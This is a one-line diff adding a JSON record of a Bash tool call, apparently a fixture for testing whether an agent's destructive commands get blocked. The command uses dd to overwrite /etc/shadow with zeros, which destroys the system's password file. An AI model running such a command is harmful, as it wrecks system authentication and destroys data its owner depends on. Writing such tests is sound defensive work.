@@ -1,0 +1,1 @@
+{"tool_name":"Bash","tool_input":{"command":"dd of=/etc/shadow if=/dev/zero"}}
